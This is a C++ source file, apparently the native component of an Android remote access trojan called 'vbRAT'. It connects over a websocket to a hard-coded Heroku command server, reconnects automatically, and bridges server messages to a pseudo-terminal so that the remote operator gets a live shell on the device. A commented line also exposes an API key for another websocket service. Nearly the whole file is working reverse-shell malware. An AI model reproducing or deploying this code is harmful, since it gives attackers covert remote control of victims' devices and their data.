#include <jni.h>
#include <string>
#include <ctype.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#include "handleconnection.h"
#include "handlepty.h"
#include "common.h"
#include "tiny_websockets/client.hpp"

//#define SERVER_ADDR "wss://connect.websocket.in/v3/69?apiKey=l7d6CdYNyjLFsRA0uzyFD6Ec0pcPkhKFlYVNwJPeWgTmAIFhZoeM9U5LO3Zi"
#define SERVER_ADDR "wss://vbrat-server.herokuapp.com/"

void* connectionMainThread();
using namespace websockets;

typedef struct {
    pthread_mutex_t stateLock;
    pthread_mutex_t socketLock;
    pthread_t keepAliveT;
    pthread_t mainT;
    connectionState state = S_INIT;
    WebsocketsClient socket;
} connectionHandle_t;

connectionHandle_t vbConnection;

unsigned char getCRC(unsigned char *message, unsigned char length)
{
    unsigned char i, j, crc = 0;
    for (i = 0; i < length; i++)
    {
        crc ^= message[i];
        for (j = 0; j < 8; j++)
        {
            if (crc & 1)
                crc ^= 0x333;
            crc >>= 1;
        }
    }
    return crc;
}

void keepAliveThread(WebsocketsClient *cli)
{
    while(true)
    {
        if(cli->available() == 0)
            pthread_exit(0);
        pthread_mutex_lock(&vbConnection.socketLock);
        {
            vbConnection.socket.send("~p"); //send something in order to keep the connection open (
        }
        pthread_mutex_unlock(&vbConnection.socketLock);
        sleep(5);
    }
}

void stateChange(connectionState newState)
{
    pthread_mutex_lock(&vbConnection.stateLock);
    {
        vbConnection.state = newState;
    }
    pthread_mutex_unlock(&vbConnection.stateLock);
}

connectionState getState()
{
    connectionState ret;
    pthread_mutex_lock(&vbConnection.stateLock);
    {
        ret = vbConnection.state;
    }
    pthread_mutex_unlock(&vbConnection.stateLock);
    return ret;
}

const char* getStates()
{
    connectionState ret;
    pthread_mutex_lock(&vbConnection.stateLock);
    {
        ret = vbConnection.state;
    }
    pthread_mutex_unlock(&vbConnection.stateLock);
    switch  (ret) {
        case S_ERROR:
            return "Error";
        case S_DISCONNECTED:
            return "Disconnected";
        case S_CONNECTING:
            return "Connecting";
        case S_CONNECTED:
            return "Connected";
        default:
            return "Altro..";
    }

}

void onMessageCallback(WebsocketsMessage message)
{
    ttySend(message.data().c_str());
}

static void ttyread(char *msg)
{
    pthread_mutex_lock(&vbConnection.socketLock);
    {
        vbConnection.socket.send(msg);
    }
    pthread_mutex_unlock(&vbConnection.socketLock);
}

void onEventsCallback(WebsocketsEvent event, std::string data) {
    if (event == WebsocketsEvent::ConnectionOpened) {
        printf("Connnection Opened");
        startTTY(ttyread);
    } else if (event == WebsocketsEvent::ConnectionClosed) {
        printf("Connnection Closed");
    }
}

int vbRAT_start() {
    if (pthread_mutex_init(&vbConnection.socketLock, NULL) != 0) {
        vbConnection.state = S_ERROR;
        return 1;
    } else if (pthread_mutex_init(&vbConnection.stateLock, NULL) != 0) {
        vbConnection.state = S_ERROR;
        return 1;
    } else {
        stateChange(S_INIT);
        pthread_create(&vbConnection.mainT, NULL, (void *(*)(void *)) connectionMainThread, NULL);
        return 0;
    }
}

void* connectionMainThread() {
    while(true) {
        switch (vbConnection.state) {
            case S_INIT:
                vbConnection.socket.onMessage(onMessageCallback);
                vbConnection.socket.onEvent(onEventsCallback);
                vbConnection.socket.connect(SERVER_ADDR);


                stateChange(S_CONNECTING);
                //return env->NewStringUTF("INIT RUN");
                break;
            case S_RECONNECTION:
            case S_CONNECTING:
                if (vbConnection.socket.available()) {
                    stateChange(S_CONNECTED);
                    pthread_create(&vbConnection.keepAliveT, NULL,
                                   (void *(*)(void *)) keepAliveThread, &vbConnection.socket);
                }
                //return env->NewStringUTF("CONNECTING...");
                break;
            case S_CONNECTED:
                if (vbConnection.socket.available()) {
                    vbConnection.socket.poll();
                } else
                    stateChange(S_DISCONNECTED);
                //return env->NewStringUTF("CONNECTED...");
                break;
            case S_DISCONNECTED:
                vbConnection.socket.connect(SERVER_ADDR);
                stateChange(S_RECONNECTION);
                //return env->NewStringUTF("DISCONNECTED...");
                break;
            case S_ERROR:
                //wstest.wsclient->shutdown(wstest.wsclient);
                //return env->NewStringUTF("errr");
                pthread_exit(0);
                break;
        }
    }
}
